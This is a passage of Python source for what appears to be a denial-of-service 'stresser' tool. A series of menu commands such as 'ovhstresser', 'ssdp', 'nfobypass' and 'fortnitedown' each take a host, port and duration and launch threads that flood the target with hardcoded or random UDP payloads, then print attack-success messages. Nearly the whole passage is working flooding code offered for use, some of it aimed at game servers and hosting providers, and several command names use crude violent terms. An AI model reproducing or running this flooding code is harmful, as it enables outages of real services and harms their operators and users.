					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfobypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitedown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitekill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
